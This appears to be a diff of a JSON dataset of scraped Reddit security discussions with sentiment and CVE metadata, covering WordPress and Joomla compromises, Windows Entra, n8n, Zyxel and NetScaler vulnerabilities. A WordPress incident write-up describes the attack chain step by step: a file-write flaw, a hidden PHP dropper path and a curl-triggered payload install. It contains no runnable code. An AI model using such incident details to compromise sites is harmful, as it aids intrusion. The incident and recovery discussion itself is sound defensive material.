+    "first_author_comment": "I dug into the access logs and cross-referenced them with recent CVE databases. It was indeed a plugin/theme vulnerability.\n\nHere is the exact breakdown of how they got in:\n\n* **The Culprit:** Thrive Themes (Thrive Architect / Thrive Visual Editor / Thrive Leads).\n* **The Vulnerability:** **CVE-2026-66694** (published just days before the attack, on Aug 6, 2026). It’s an Unauthenticated XSS vulnerability that essentially allowed arbitrary file writing on versions `&lt;= 10.9.3.1`.\n* **How it played out (from the access logs):**\n   1. The bots scanned the site and successfully exploited the vulnerability to write a random 20-character hex text file (`52faade47ac664d8d0d3.txt`) to the site root to verify write privileges.\n   2. Once confirmed, they uploaded a hidden PHP dropper named `_w10_up.php` straight into the `/wp-content/themes/thrive-theme/js/` directory.\n   3. A few seconds later, they triggered that dropper via a `curl` request to install the actual PopCash payload (`qtt-ppck-core.php` and the `wp-ppck-assets.php` mu-plugin).\n\nMy site had actually updated to the patched version (`10.9.3.2`) shortly *after* the initial breach, which closed the front door, but the `_w10_up.php` dropper was already sitting inside the theme files, acting as a backdoor.",
+    "num_comments": 13,
+    "score": 32,
+    "subreddit": "Wordpress",
+    "tag": null,
+    "tags": [],
+    "title": "Found PopCash \"stealth pop-under\" malware hiding in WordPress mu-plugins — bypassed every scanner, here's how to find and remove it",
+    "updatedAt": "2026-08-19T01:08:16.711Z",
+    "upvote_ratio": 0.98,
+    "url": "https://reddit.com/r/Wordpress/comments/1vrjuu3/found_popcash_stealth_popunder_malware_hiding_in/",
+    "versionList": [],
+    "metadata": {
+      "predicted": {
+        "isUpdateRelated": false,
+        "positiveScore": 0.07409118941235802,
+        "timestampPredicted": "2026-08-18T16:01:01.370827+00:00"
+      },
+      "labeled": {
+        "isUpdateRelated": null
+      }
+    },
+    "isAboutCve": true,
+    "isAboutLatestUpdate": true,
+    "classification": {
+      "securityType": [
+        "SECURITY"
+      ],
+      "componentType": [
+        "APP"
+      ]
+    },
+    "author_description_sentiment": {
+      "score": -0.984,
+      "detail": {
+        "neg": 0.082,
+        "neu": 0.872,
+        "pos": 0.046,
+        "compound": -0.9844
+      }
+    },
+    "category": "Negative",
+    "comments_avg_sentiment_score": 0.381,
+    "sentiment_score": -0.302
+  },
+  {
     "_id": "6a8335e849715ba39188280b",
     "redditId": "1vqwmq6",
     "author": "zero_cool09",
@@ -10,45 +458,77 @@
         "id": "p48ubfh",
         "author": "_SleezyPMartini_",
         "body": "light on details, what is this \"special browser\" ?",
-        "score": 1,
+        "score": 4,
         "created_utc_ts": 1786983886,
         "created_utc": "2026-08-17T16:24:46",
         "permalink": "https://reddit.com/r/sysadmin/comments/1vqwmq6/windows_entra_login_exploit_used_from_the_event/p48ubfh/",
         "parent_id": "t3_1vqwmq6",
-        "is_submitter": false
+        "is_submitter": false,
+        "sentiment_score": 0.481,
+        "sentiment_bucket": "Positive",
+        "sentiment_detail": {
+          "neg": 0,
+          "neu": 0.691,
+          "pos": 0.309,
+          "compound": 0.481
+        }
       },
       {
         "id": "p48uhb1",
         "author": "maxxpc",
         "body": "Was also fixed in July’s Windows Updates.\n\nhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-34348",
-        "score": 1,
+        "score": 23,
         "created_utc_ts": 1786983930,
         "created_utc": "2026-08-17T16:25:30",
         "permalink": "https://reddit.com/r/sysadmin/comments/1vqwmq6/windows_entra_login_exploit_used_from_the_event/p48uhb1/",
         "parent_id": "t3_1vqwmq6",
-        "is_submitter": false
+        "is_submitter": false,
+        "sentiment_score": 0,
+        "sentiment_bucket": "Neutral",
+        "sentiment_detail": {
+          "neg": 0,
+          "neu": 1,
+          "pos": 0,
+          "compound": 0
+        }
       },
       {
         "id": "p48uw9w",
         "author": "zero_cool09",
         "body": "Good to hear, still interesting to see such an exploit in action.",
-        "score": 1,
+        "score": 3,
         "created_utc_ts": 1786984039,
         "created_utc": "2026-08-17T16:27:19",
         "permalink": "https://reddit.com/r/sysadmin/comments/1vqwmq6/windows_entra_login_exploit_used_from_the_event/p48uw9w/",
         "parent_id": "t1_p48uhb1",
-        "is_submitter": true
+        "is_submitter": true,
+        "sentiment_score": 0.637,
+        "sentiment_bucket": "Positive",
+        "sentiment_detail": {
+          "neg": 0.087,
+          "neu": 0.562,
+          "pos": 0.35,
+          "compound": 0.6369
+        }
       },
       {
         "id": "p49bbmd",
         "author": "Thotaz",
         "body": "You'd think it would be common sense to not log passwords/authentication tokens in a general purpose log, but I guess it wasn't for the developer(s) that worked on this feature.",
-        "score": 1,
+        "score": 3,
         "created_utc_ts": 1786988201,
         "created_utc": "2026-08-17T17:36:41",
         "permalink": "https://reddit.com/r/sysadmin/comments/1vqwmq6/windows_entra_login_exploit_used_from_the_event/p49bbmd/",
         "parent_id": "t3_1vqwmq6",
-        "is_submitter": false
+        "is_submitter": false,
+        "sentiment_score": 0,
+        "sentiment_bucket": "Neutral",
+        "sentiment_detail": {
+          "neg": 0,
+          "neu": 1,
+          "pos": 0,
+          "compound": 0
+        }
       },
       {
         "id": "p4bivvm",
@@ -59,7 +539,15 @@
         "created_utc": "2026-08-17T23:42:37",
         "permalink": "https://reddit.com/r/sysadmin/comments/1vqwmq6/windows_entra_login_exploit_used_from_the_event/p4bivvm/",
         "parent_id": "t3_1vqwmq6",
-        "is_submitter": false
+        "is_submitter": false,
+        "sentiment_score": -0.118,
+        "sentiment_bucket": "Neutral",
+        "sentiment_detail": {
+          "neg": 0.114,
+          "neu": 0.785,
+          "pos": 0.101,
+          "compound": -0.1176
+        }
       },
       {
         "id": "p4bjdft",
@@ -70,19 +558,65 @@
         "created_utc": "2026-08-17T23:45:15",
         "permalink": "https://reddit.com/r/sysadmin/comments/1vqwmq6/windows_entra_login_exploit_used_from_the_event/p4bjdft/",
         "parent_id": "t1_p49bbmd",
-        "is_submitter": false
+        "is_submitter": false,
+        "sentiment_score": -0.226,
+        "sentiment_bucket": "Negative",
+        "sentiment_detail": {
+          "neg": 0.082,
+          "neu": 0.873,
+          "pos": 0.046,
+          "compound": -0.2263
+        }
+      },
+      {
+        "id": "p4d8rjh",
+        "author": "reloadtak",
+        "body": "One with an extension that lets you manipulate the session values.",
+        "score": 1,
+        "created_utc_ts": 1787033612,
+        "created_utc": "2026-08-18T06:13:32",
+        "permalink": "https://reddit.com/r/sysadmin/comments/1vqwmq6/windows_entra_login_exploit_used_from_the_event/p4d8rjh/",
+        "parent_id": "t1_p48ubfh",
+        "is_submitter": false,
+        "sentiment_score": 0.402,
+        "sentiment_bucket": "Positive",
+        "sentiment_detail": {
+          "neg": 0,
+          "neu": 0.787,
+          "pos": 0.213,
+          "compound": 0.4019
+        }
+      },
+      {
+        "id": "p4gu8dr",
+        "author": "CeC-P",
+        "body": "\"Just dump the whole damn key into the event log\" - power duo of MS's engineer with a totally real and not fake at all degree and Copilot's new coding AI that kinda almost works sometimes maybe.",
+        "score": 1,
+        "created_utc_ts": 1787077523,
+        "created_utc": "2026-08-18T18:25:23",
+        "permalink": "https://reddit.com/r/sysadmin/comments/1vqwmq6/windows_entra_login_exploit_used_from_the_event/p4gu8dr/",
+        "parent_id": "t3_1vqwmq6",
+        "is_submitter": false,
+        "sentiment_score": -0.411,
+        "sentiment_bucket": "Negative",
+        "sentiment_detail": {
+          "neg": 0.133,
+          "neu": 0.803,
+          "pos": 0.064,
+          "compound": -0.411
+        }
       }
     ],
     "created_utc": "2026-08-17T16:17:43",
     "first_author_comment": "Good to hear, still interesting to see such an exploit in action.",
-    "num_comments": 6,
-    "score": 22,
+    "num_comments": 9,
+    "score": 32,
     "subreddit": "sysadmin",
     "tag": null,
     "tags": [],
     "title": "Windows Entra login exploit used from the event log data. Check out the demo link",
-    "updatedAt": "2026-08-18T02:25:24.823Z",
-    "upvote_ratio": 0.74,
+    "updatedAt": "2026-08-19T00:31:14.129Z",
+    "upvote_ratio": 0.8,
     "url": "https://reddit.com/r/sysadmin/comments/1vqwmq6/windows_entra_login_exploit_used_from_the_event/",
     "versionList": [],
     "classification": {
@@ -98,7 +632,7 @@
       "predicted": {
         "isUpdateRelated": false,
         "positiveScore": 0.00018935258989634878,
-        "timestampPredicted": "2026-08-18T00:01:14.819743+00:00"
+        "timestampPredicted": "2026-08-18T04:01:34.226594+00:00"
       },
       "labeled": {
         "isUpdateRelated": null
@@ -116,8 +650,8 @@
       }
     },
     "category": "Positive",
-    "comments_avg_sentiment_score": 0.279,
-    "sentiment_score": 0.441
+    "comments_avg_sentiment_score": 0.096,
+    "sentiment_score": 0.349
   },
   {
     "_id": "6a8302b649715ba391881d95",
@@ -128,13 +662,13 @@
     "created_utc": "2026-08-17T12:17:40",
     "first_author_comment": null,
     "num_comments": 1,
-    "score": 6,
+    "score": 9,
     "subreddit": "netsec",
     "tag": null,
     "tags": [],
     "title": "From AKS node root vulnerability to Microsoft Copilot hijack (CVE-2026-32193)",
-    "updatedAt": "2026-08-18T00:27:38.606Z",
-    "upvote_ratio": 0.75,
+    "updatedAt": "2026-08-19T02:46:18.626Z",
+    "upvote_ratio": 0.77,
     "url": "https://reddit.com/r/netsec/comments/1vqqpwn/from_aks_node_root_vulnerability_to_microsoft/",
     "versionList": [
       "2026.0.0",
@@ -340,7 +874,7 @@
     "tag": "Other",
     "tags": [],
     "title": "Can the ISP use my DVR to monitor me?",
-    "updatedAt": "2026-08-18T00:28:30.370Z",
+    "updatedAt": "2026-08-19T00:32:58.981Z",
     "upvote_ratio": 0.22,
     "url": "https://reddit.com/r/networking/comments/1vqjehf/can_the_isp_use_my_dvr_to_monitor_me/",
     "versionList": [],
@@ -382,15 +916,15 @@
     "author_description": "Technical analysis of CVE-2026-6837, an authenticated command-injection vulnerability in Zyxel’s PKCS#12 certificate export flow.\n\nThe post covers the vulnerable execution path, root cause, affected firmware scope, and the firmware-emulation methodology used during analysis.",
     "awards": [],
     "created_utc": "2026-08-16T18:48:50",
-    "first_author_comment": null,
-    "num_comments": 0,
-    "score": 11,
+    "first_author_comment": "Appreciate it ;)",
+    "num_comments": 2,
+    "score": 15,
     "subreddit": "netsec",
     "tag": null,
     "tags": [],
     "title": "CVE-2026-6837: Command Injection in Zyxel export-cgi PKCS#12 Export Handling",
-    "updatedAt": "2026-08-18T02:46:45.399Z",
-    "upvote_ratio": 0.84,
+    "updatedAt": "2026-08-19T02:46:19.902Z",
+    "upvote_ratio": 0.87,
     "url": "https://reddit.com/r/netsec/comments/1vq55y4/cve20266837_command_injection_in_zyxel_exportcgi/",
     "versionList": [
       "2026.0.0",
@@ -426,10 +960,33 @@
         "compound": -0.5267
       }
     },
-    "category": "Negative",
-    "comments": [],
-    "comments_avg_sentiment_score": 0,
-    "sentiment_score": -0.263
+    "category": "Neutral",
+    "comments": [
+      {
+        "id": "p4dmgqp",
+        "author": "scriptqzor",
+        "body": "wild how “authenticated” vulns like this end up being just as bad in practice once someone chains them with weak creds or another bug. really like that you covered the emulation side too, that stuff is super underrated in writeups.",
+        "score": 2,
+        "created_utc_ts": 1787040547,
+        "created_utc": "2026-08-18T08:09:07",
+        "permalink": "https://reddit.com/r/netsec/comments/1vq55y4/cve20266837_command_injection_in_zyxel_exportcgi/p4dmgqp/",
+        "parent_id": "t3_1vq55y4",
+        "is_submitter": false
+      },
+      {
+        "id": "p4eif64",
+        "author": "TheReedemer69",
+        "body": "Appreciate it ;)",
+        "score": 1,
+        "created_utc_ts": 1787054810,
+        "created_utc": "2026-08-18T12:06:50",
+        "permalink": "https://reddit.com/r/netsec/comments/1vq55y4/cve20266837_command_injection_in_zyxel_exportcgi/p4eif64/",
+        "parent_id": "t1_p4dmgqp",
+        "is_submitter": true
+      }
+    ],
+    "comments_avg_sentiment_score": 0.459,
+    "sentiment_score": -0.034
   },
   {
     "_id": "6a81cd2849715ba39187f575",
@@ -440,12 +997,12 @@
     "created_utc": "2026-08-16T13:33:02",
     "first_author_comment": "They already patched this",
     "num_comments": 4,
-    "score": 37,
+    "score": 38,
     "subreddit": "netsec",
     "tag": null,
     "tags": [],
     "title": "CVE-2026-33696: From a Schema Name to RCE in n8n",
-    "updatedAt": "2026-08-18T02:46:45.919Z",
+    "updatedAt": "2026-08-19T02:46:20.419Z",
     "upvote_ratio": 0.85,
     "url": "https://reddit.com/r/netsec/comments/1vpx6ku/cve202633696_from_a_schema_name_to_rce_in_n8n/",
     "versionList": [
@@ -475,7 +1032,7 @@
         "id": "p44tvfs",
         "author": "ckwalsh",
         "body": "\\&gt; One request, full shell.\n\nOne sentence, full confidence of AI authorship.",
-        "score": 3,
+        "score": 4,
         "created_utc_ts": 1786928792,
         "created_utc": "2026-08-17T01:06:32",
         "permalink": "https://reddit.com/r/netsec/comments/1vpx6ku/cve202633696_from_a_schema_name_to_rce_in_n8n/p44tvfs/",
@@ -514,9 +1071,9 @@
         "compound": 0
       }
     },
-    "category": "Positive",
-    "comments_avg_sentiment_score": 0.557,
-    "sentiment_score": 0.279
+    "category": "Neutral",
+    "comments_avg_sentiment_score": 0.333,
+    "sentiment_score": 0.166
   },
   {
     "_id": "6a80b98b49715ba3918773f7",
@@ -1085,7 +1642,7 @@
     "tag": null,
     "tags": [],
     "title": "Keeping WP sites secure ?",
-    "updatedAt": "2026-08-18T00:33:46.684Z",
+    "updatedAt": "2026-08-19T00:38:20.345Z",
     "upvote_ratio": 0.64,
     "url": "https://reddit.com/r/Wordpress/comments/1vp9i5g/keeping_wp_sites_secure/",
     "versionList": [],
@@ -1611,7 +2168,7 @@
     "tag": null,
     "tags": [],
     "title": "Half our dev time now goes into security. Some thoughts on open source’s future.",
-    "updatedAt": "2026-08-18T00:35:34.481Z",
+    "updatedAt": "2026-08-19T00:40:07.182Z",
     "upvote_ratio": 0.82,
     "url": "https://reddit.com/r/Wordpress/comments/1vov68k/half_our_dev_time_now_goes_into_security_some/",
     "versionList": [],
@@ -1660,7 +2217,7 @@
     "tag": null,
     "tags": [],
     "title": "August 2026 Patch Tuesday Issue - WDS TFTP CVE Fix for PXE boot.",
-    "updatedAt": "2026-08-18T00:36:48.524Z",
+    "updatedAt": "2026-08-19T00:41:22.765Z",
     "upvote_ratio": 0.97,
     "url": "https://reddit.com/r/sysadmin/comments/1vojhyi/august_2026_patch_tuesday_issue_wds_tftp_cve_fix/",
     "versionList": [
@@ -2135,7 +2692,7 @@
     "tag": "Discussion",
     "tags": [],
     "title": "Highest number of kernel updates on Fedora I've seen in years?",
-    "updatedAt": "2026-08-18T00:38:27.979Z",
+    "updatedAt": "2026-08-19T00:43:02.234Z",
     "upvote_ratio": 0.64,
     "url": "https://reddit.com/r/Fedora/comments/1vo6zr9/highest_number_of_kernel_updates_on_fedora_ive/",
     "versionList": [],
@@ -2181,12 +2738,12 @@
     "created_utc": "2026-08-14T07:10:17",
     "first_author_comment": null,
     "num_comments": 2,
-    "score": 43,
+    "score": 47,
     "subreddit": "netsec",
     "tag": null,
     "tags": [],
     "title": "You’re Back In The Room (Citrix NetScaler Pre-Auth RCE CVE-2026-8452(?)) - watchTowr Labs",
-    "updatedAt": "2026-08-18T02:46:47.496Z",
+    "updatedAt": "2026-08-19T02:46:22.033Z",
     "upvote_ratio": 0.94,
     "url": "https://reddit.com/r/netsec/comments/1vo06aj/youre_back_in_the_room_citrix_netscaler_preauth/",
     "versionList": [
@@ -2226,7 +2783,7 @@
         "id": "p3nit6d",
         "author": "Emergency_Stable_923",
         "body": "I feel like I remember at least two other bad pre-auth RCEs on NetScaler! It seems like every three years like clockwork someone drops a new exploit. Is this just a bad SSDLC process or legacy codebase design? I'm super curious if these bugs were hiding in the original code all along or if they got added in later updates!",
-        "score": 5,
+        "score": 6,
         "created_utc_ts": 1786717254,
         "created_utc": "2026-08-14T14:20:54",
         "permalink": "https://reddit.com/r/netsec/comments/1vo06aj/youre_back_in_the_room_citrix_netscaler_preauth/p3nit6d/",
@@ -2256,14 +2813,14 @@
     "awards": [],
     "created_utc": "2026-08-13T20:33:03",
     "first_author_comment": null,
-    "num_comments": 46,
-    "score": 65,
+    "num_comments": 47,
+    "score": 66,
     "subreddit": "PFSENSE",
     "tag": "Announcement",
     "tags": [],
     "title": "Netgate Releases pfSense Plus Software Version 26.07",
-    "updatedAt": "2026-08-18T02:42:46.718Z",
-    "upvote_ratio": 0.87,
+    "updatedAt": "2026-08-19T02:42:24.349Z",
+    "upvote_ratio": 0.88,
     "url": "https://reddit.com/r/PFSENSE/comments/1vnmhke/netgate_releases_pfsense_plus_software_version/",
     "versionList": [
       "26.07.0"
@@ -2283,7 +2840,7 @@
         "id": "p3jl7p7",
         "author": "Independent-Neat-166",
         "body": "Much love for the Netgate team. Awesome work",
-        "score": 12,
+        "score": 13,
         "created_utc_ts": 1786663215,
         "created_utc": "2026-08-13T23:20:15",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vnmhke/netgate_releases_pfsense_plus_software_version/p3jl7p7/",
@@ -2294,7 +2851,7 @@
         "id": "p3jqk39",
         "author": "love_hounds",
         "body": "Is the Netgate 3100 still supported on this release?",
-        "score": 3,
+        "score": 2,
         "created_utc_ts": 1786664918,
         "created_utc": "2026-08-13T23:48:38",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vnmhke/netgate_releases_pfsense_plus_software_version/p3jqk39/",
@@ -2305,7 +2862,7 @@
         "id": "p3js3dq",
         "author": "rizon",
         "body": "According to this, it does: [https://www.netgate.com/blog/keeping-the-netgate-3100-alive-one-upstream-patch-at-a-time](https://www.netgate.com/blog/keeping-the-netgate-3100-alive-one-upstream-patch-at-a-time)\n\nI have a single 3100 left in service so haven't confirmed yet.",
-        "score": 7,
+        "score": 6,
         "created_utc_ts": 1786665416,
         "created_utc": "2026-08-13T23:56:56",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vnmhke/netgate_releases_pfsense_plus_software_version/p3js3dq/",
@@ -2316,7 +2873,7 @@
         "id": "p3jy5mw",
         "author": "totallyjaded",
         "body": "Is there a timeline for those of us who paid for Plus and are left out in the cold on Nexus? Or is it more of a \"Thanks for the money. Now buy our hardware or shut up.\" kind of thing?",
-        "score": 2,
+        "score": 3,
         "created_utc_ts": 1786667378,
         "created_utc": "2026-08-14T00:29:38",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vnmhke/netgate_releases_pfsense_plus_software_version/p3jy5mw/",
@@ -2327,7 +2884,7 @@
         "id": "p3kfqpm",
         "author": "barkollokrab",
         "body": "Let me know if anyone updates an sg2440 and how it goes. Thanks\n\nEnded up updating my own...no issues observed so far and it was quick.",
-        "score": 4,
+        "score": 5,
         "created_utc_ts": 1786673209,
         "created_utc": "2026-08-14T02:06:49",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vnmhke/netgate_releases_pfsense_plus_software_version/p3kfqpm/",
@@ -2338,7 +2895,7 @@
         "id": "p3kkqh0",
         "author": "gonzopancho",
         "body": "Not sure what you mean by “out in the cold”.",
-        "score": 2,
+        "score": 3,
         "created_utc_ts": 1786674923,
         "created_utc": "2026-08-14T02:35:23",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vnmhke/netgate_releases_pfsense_plus_software_version/p3kkqh0/",
@@ -2360,7 +2917,7 @@
         "id": "p3l8a5o",
         "author": "181-dff",
         "body": "Successful update on Netgate 7100 and 3100",
-        "score": 4,
+        "score": 5,
         "created_utc_ts": 1786684222,
         "created_utc": "2026-08-14T05:10:22",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vnmhke/netgate_releases_pfsense_plus_software_version/p3l8a5o/",
@@ -2635,7 +3192,7 @@
         "id": "p4bp4om",
         "author": "kphillips-netgate",
         "body": "It's a supported appliance, so yes.",
-        "score": 1,
+        "score": 2,
         "created_utc_ts": 1787012198,
         "created_utc": "2026-08-18T00:16:38",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vnmhke/netgate_releases_pfsense_plus_software_version/p4bp4om/",
@@ -2643,8 +3200,8 @@
         "is_submitter": false
       }
     ],
-    "comments_avg_sentiment_score": 0.264,
-    "sentiment_score": 0.621,
+    "comments_avg_sentiment_score": 0.261,
+    "sentiment_score": 0.619,
     "classification": {
       "securityType": [
         "UNKNOWN"
@@ -3250,7 +3807,7 @@
     "tag": null,
     "tags": [],
     "title": "CVE-2026-59310 Under Active Exploitation",
-    "updatedAt": "2026-08-18T00:41:33.321Z",
+    "updatedAt": "2026-08-19T00:46:12.785Z",
     "upvote_ratio": 0.94,
     "url": "https://reddit.com/r/sysadmin/comments/1vnh3kn/cve202659310_under_active_exploitation/",
     "versionList": [
@@ -3289,6 +3846,98 @@
     "sentiment_score": 0.343
   },
   {
+    "_id": "6a84ad3449715ba391887c79",
+    "redditId": "1vngswj",
+    "author": "Actual-Let1595",
+    "author_description": "A clean file scan does not prove that a Joomla site is clean.\n\n\n\nRecent attacks have used vulnerable JCE, SP Page Builder and Helix3 installations. In some cases malicious JavaScript or configuration changes can live in the database, so checking only recently modified PHP files can produce a false sense of safety.\n\n\n\nMy practical recovery order would be:\n\n\n\n1. Put the site behind maintenance mode or restrict access before changing anything.\n\n2. Preserve a forensic copy of both files and database.\n\n3. Check the installed versions of JCE, SP Page Builder and both Helix3 plugins. Do not rely only on the Joomla update screen.\n\n4. Close the entry point before cleanup. For Helix3, NVD lists versions through 3.1.1 as affected; update both plugins to 3.1.2 or later.\n\n5. Inspect database content as well as files: template settings, custom-code fields, modules, articles and suspicious injected scripts.\n\n6. Review Super Users, scheduled tasks, update sites and server access logs.\n\n7. Rotate Joomla, hosting, database, FTP/SFTP and API credentials, then invalidate active sessions.\n\n8. Compare Joomla core and extensions with clean packages and monitor for reinfection.\n\n\n\nUpdating closes the known entry point, but it does not remove a payload that was already planted. JCE explicitly makes that distinction in its advisory.\n\n\n\nPrimary references:\n\n\n\n\\- JCE CVE-2026-48907: [https://nvd.nist.gov/vuln/detail/CVE-2026-48907](https://nvd.nist.gov/vuln/detail/CVE-2026-48907)\n\n\\- JCE vendor advisory: [https://www.joomlacontenteditor.net/news/jce-security-update-and-a-free-patch-for-older-sites](https://www.joomlacontenteditor.net/news/jce-security-update-and-a-free-patch-for-older-sites)\n\n\\- SP Page Builder CVE-2026-48908: [https://nvd.nist.gov/vuln/detail/CVE-2026-48908](https://nvd.nist.gov/vuln/detail/CVE-2026-48908)\n\n\\- Helix3 CVE-2026-49049: [https://nvd.nist.gov/vuln/detail/CVE-2026-49049](https://nvd.nist.gov/vuln/detail/CVE-2026-49049)\n\n\n\nWhat have you found most useful for detecting database-side persistence after this type of incident?",
+    "awards": [],
+    "comments": [
+      {
+        "id": "p3ke3v6",
+        "author": "Open_Sourcey",
+        "body": "Another attack has occured. This time it is Edocman and they either cannot or will not patch an older version. The attack uses the fact that the Edocman developers did not take care to use prepared statements and so it was vulnerable to a SQL Injection attack. I suspect it is to steal user informatiom.\n\n  \nIt seems as though the age of AI has launched a flurry of Joomla attacks.",
+        "score": 1,
+        "created_utc_ts": 1786672658,
+        "created_utc": "2026-08-14T01:57:38",
+        "permalink": "https://reddit.com/r/joomla/comments/1vngswj/why_an_antonkill_joomla_site_can_still_look/p3ke3v6/",
+        "parent_id": "t3_1vngswj",
+        "is_submitter": false,
+        "sentiment_score": -0.958,
+        "sentiment_bucket": "Negative",
+        "sentiment_detail": {
+          "neg": 0.27,
+          "neu": 0.688,
+          "pos": 0.041,
+          "compound": -0.9583
+        }
+      },
+      {
+        "id": "p3oscj6",
+        "author": "cesarramccp",
+        "body": "How great not to use any of those extensions.",
+        "score": 1,
+        "created_utc_ts": 1786729194,
+        "created_utc": "2026-08-14T17:39:54",
+        "permalink": "https://reddit.com/r/joomla/comments/1vngswj/why_an_antonkill_joomla_site_can_still_look/p3oscj6/",
+        "parent_id": "t3_1vngswj",
+        "is_submitter": false,
+        "sentiment_score": 0.625,
+        "sentiment_bucket": "Positive",
+        "sentiment_detail": {
+          "neg": 0,
+          "neu": 0.661,
+          "pos": 0.339,
+          "compound": 0.6249
+        }
+      },
+      {
+        "id": "p3qk8mi",
+        "author": "Actual-Let1595",
+        "body": "That is worth treating as a separate data-breach investigation. With SQL injection, a clean file scan is especially weak evidence because the attacker may only query or alter the database and never write a PHP file. I would preserve web and database logs first, identify the vulnerable EDocman version and endpoint, then look for unusual query strings or POST bodies, bursts of requests, large responses, new admin users, session changes, and exports. Patch or remove the component before reopening, rotate database and Joomla credentials, and establish which tables and fields were exposed. AI probably makes discovery and exploitation cheaper, but the logs are what can distinguish scanning from successful extraction.",
+        "score": 2,
+        "created_utc_ts": 1786746692,
+        "created_utc": "2026-08-14T22:31:32",
+        "permalink": "https://reddit.com/r/joomla/comments/1vngswj/why_an_antonkill_joomla_site_can_still_look/p3qk8mi/",
+        "parent_id": "t1_p3ke3v6",
+        "is_submitter": true,
+        "sentiment_score": 0.535,
+        "sentiment_bucket": "Positive",
+        "sentiment_detail": {
+          "neg": 0.062,
+          "neu": 0.864,
+          "pos": 0.074,
+          "compound": 0.5351
+        }
+      }
+    ],
+    "created_utc": "2026-08-13T17:10:50",
+    "first_author_comment": "That is worth treating as a separate data-breach investigation. With SQL injection, a clean file scan is especially weak evidence because the attacker may only query or alter the database and never write a PHP file. I would preserve web and database logs first, identify the vulnerable EDocman version and endpoint, then look for unusual query strings or POST bodies, bursts of requests, large responses, new admin users, session changes, and exports. Patch or remove the component before reopening, rotate database and Joomla credentials, and establish which tables and fields were exposed. AI probably makes discovery and exploitation cheaper, but the logs are what can distinguish scanning from successful extraction.",
+    "num_comments": 3,
+    "score": 0,
+    "subreddit": "joomla",
+    "tag": "Administration/Technical",
+    "tags": [],
+    "title": "Why an AntonKill Joomla site can still look hacked after a clean file scan",
+    "updatedAt": "2026-08-19T00:46:15.226Z",
+    "upvote_ratio": 0.5,
+    "url": "https://reddit.com/r/joomla/comments/1vngswj/why_an_antonkill_joomla_site_can_still_look/",
+    "versionList": [],
+    "isAboutCve": true,
+    "isAboutLatestUpdate": true,
+    "author_description_sentiment": {
+      "score": 0.853,
+      "detail": {
+        "neg": 0.033,
+        "neu": 0.897,
+        "pos": 0.07,
+        "compound": 0.8534
+      }
+    },
+    "category": "Positive",
+    "comments_avg_sentiment_score": 0.067,
+    "sentiment_score": 0.46
+  },
+  {
     "_id": "6a7cf93e49715ba39184c3bc",
     "redditId": "1vmcn4a",
     "author": "unknownhad",
@@ -3304,7 +3953,7 @@
       "Security"
     ],
     "title": "CVE-2026-53360: KVM SEV-SNP guest-to-host heap OOB and analysis of the upstream fix",
-    "updatedAt": "2026-08-18T00:46:31.969Z",
+    "updatedAt": "2026-08-19T00:51:26.748Z",
     "upvote_ratio": 0.86,
     "url": "https://reddit.com/r/linux/comments/1vmcn4a/cve202653360_kvm_sevsnp_guesttohost_heap_oob_and/",
     "versionList": [
@@ -3395,13 +4044,13 @@
     "created_utc": "2026-08-12T10:31:17",
     "first_author_comment": "Hello author here  \nI independently found this in May while looking at KVM's SEVSNP PSC path, but Stan Shaw had reported it about a month before me.  \nI decided to publish my analysis anyway, as the most interesting part for me ended up being why the patch I originally proposed was incomplete and how the upstream KVM fix handled the problem differently.  \nI also dive into the exploitation side failure oracle, constrained write, repeatability, slab selection... I have not demonstrated a reliable complete VM escape, and I have tried to keep that distinction explicit in the writeup.  \nI have tried creating 2 safe CTF style exercises that model the primitive without touching real KVM or requiring SEV-SNP hardware. (becasue why not as it was fun)  \nComments/Correction to the exploitation analysis are very welcome.",
     "num_comments": 4,
-    "score": 35,
+    "score": 32,
     "subreddit": "netsec",
     "tag": null,
     "tags": [],
     "title": "CVE-2026-53360: KVM SEV-SNP guest-to-host heap OOB and analysis of the upstream fix",
-    "updatedAt": "2026-08-18T02:46:51.751Z",
-    "upvote_ratio": 0.92,
+    "updatedAt": "2026-08-19T02:46:26.520Z",
+    "upvote_ratio": 0.89,
     "url": "https://reddit.com/r/netsec/comments/1vmadcw/cve202653360_kvm_sevsnp_guesttohost_heap_oob_and/",
     "versionList": [
       "2026.0.0",
@@ -3452,13 +4101,13 @@
     "created_utc": "2026-08-12T09:23:41",
     "first_author_comment": null,
     "num_comments": 2,
-    "score": 9,
+    "score": 8,
     "subreddit": "netsec",
     "tag": null,
     "tags": [],
     "title": "ERPNext's Document Follow feature exposed unauthorized data",
-    "updatedAt": "2026-08-18T02:46:52.932Z",
-    "upvote_ratio": 0.82,
+    "updatedAt": "2026-08-19T02:46:27.720Z",
+    "upvote_ratio": 0.85,
     "url": "https://reddit.com/r/netsec/comments/1vm95nk/erpnexts_document_follow_feature_exposed/",
     "versionList": [],
     "author_description_sentiment": {
@@ -3487,7 +4136,7 @@
         "id": "p32lzsi",
         "author": "ukindom",
         "body": "What’s about podman and other docker compatible tools? ",
-        "score": 9,
+        "score": 8,
         "created_utc_ts": 1786467749,
         "created_utc": "2026-08-11T17:02:29",
         "permalink": "https://reddit.com/r/netsec/comments/1vlkth5/copyescape_containertohost_arbitrary_file_write/p32lzsi/",
@@ -3509,7 +4158,7 @@
         "id": "p32y3md",
         "author": "muzso",
         "body": "I'm guessing they didn't go into podman, otherwise they'd have mentioned it in the blog post.\n\nCVE-2026-17106 is a specific implementation mistake/bug, so unless podman copy&amp;pasted the respective code from Docker, the issue shouldn't automatically apply to it as well.",
-        "score": 10,
+        "score": 9,
         "created_utc_ts": 1786470777,
         "created_utc": "2026-08-11T17:52:57",
         "permalink": "https://reddit.com/r/netsec/comments/1vlkth5/copyescape_containertohost_arbitrary_file_write/p32y3md/",
@@ -3520,7 +4169,7 @@
         "id": "p330x9b",
         "author": "ronmasas",
